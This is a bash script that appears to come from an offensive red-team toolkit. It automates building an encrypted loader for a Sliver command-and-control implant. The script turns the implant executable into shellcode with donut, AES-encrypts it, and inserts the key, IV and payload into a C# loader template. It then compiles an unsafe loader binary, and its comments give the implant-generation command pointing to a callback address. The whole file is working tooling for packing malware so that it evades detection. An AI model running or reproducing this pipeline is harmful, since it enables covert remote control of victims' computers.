#!/bin/bash

lhost="10.0.0.189"
lport="8888"
arch="x64"
c2type="sliver"

echo 'lhost: '$lhost
echo 'lport: '$lport
echo 'arch:  '$arch
echo 'c2type:'$c2type

mkdir tmp
mkdir output

### To Generate a Sliver implant without obfuscation:
# [server] sliver > generate -N SliverNoObf --mtls 10.0.0.189 --skip-symbols --save /opt/
# [*] Generating new windows/amd64 implant binary
# [*] Symbol obfuscation is enabled
# [*] Build completed in 00:00:24
# [*] Implant saved to /opt/slivernoobf.exe
#
### Move the /opt/slivernoobf.exe to folder input and rename to Sliver.exe, then run the autogen script.

rawscfilename='Sliver.bin'
rawscfilename_enc=$rawscfilename'.enc'
raw_cs_filename_compiled='Sliver.exe'

if [ $arch = 'x64' ]
then
    donut/donut -a 2 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
fi

if [ $arch = 'x86' ]
then
    donut/donut -a 1 -b 1 -o input/$rawscfilename -f input/$raw_cs_filename_compiled
fi

sleep 2

cp aesloader_template.txt tmp/aesloadermono_sliver.cs

mono-csc -out:encryptor.exe -platform:x64 encryptor.cs

mono encryptor.exe input/$rawscfilename tmp/$rawscfilename_enc | tee tmp/enc_output.txt

encpayload=$(cat tmp/enc_output.txt | grep 'Encrypted' | cut -d ' ' -f 2)
encpayloadlength=$(cat tmp/enc_output.txt | grep 'PayloadLength' | cut -d ':' -f 2)
aeskey=$(cat tmp/enc_output.txt | grep 'AES_Key' | cut -d ':' -f 2)
aesiv=$(cat tmp/enc_output.txt | grep 'AES_IV' | cut -d ':' -f 2)

if [ $arch = 'x64' ]
then
    sed -i 's|{{TARGETARCH}}|true|g' tmp/aesloadermono_sliver.cs
fi

if [ $arch = 'x86' ]
then
    sed -i 's|{{TARGETARCH}}|false|g' tmp/aesloadermono_sliver.cs
fi
sleep 1
sed -i 's|{{AESKEY}}|'$aeskey'|g' tmp/aesloadermono_sliver.cs
sleep 1
sed -i 's|{{AESIV}}|'$aesiv'|g' tmp/aesloadermono_sliver.cs
sleep 1
sed -i 's|{{PAYLOADLENGTH}}|'$encpayloadlength'|g' tmp/aesloadermono_sliver.cs
sleep 1
#sed -i 's|{{ENCSHELLCODEPAYLOAD}}|'$encpayload'|g' tmp/aesloadermono_sliver.cs
sed -i '' -f /dev/stdin tmp/aesloadermono_sliver.cs << EOF
s/{{ENCSHELLCODEPAYLOAD}}/$encpayload/g
EOF
sleep 1

if [ $arch = 'x64' ]
then
    mono-csc -out:output/aesloadermono_sliver_x64.exe -platform:x64 -unsafe tmp/aesloadermono_sliver.cs
fi

if [ $arch = 'x86' ]
then
    mono-csc -out:output/aesloadermono_sliver_x86.exe -platform:x86 -unsafe tmp/aesloadermono_sliver.cs
fi
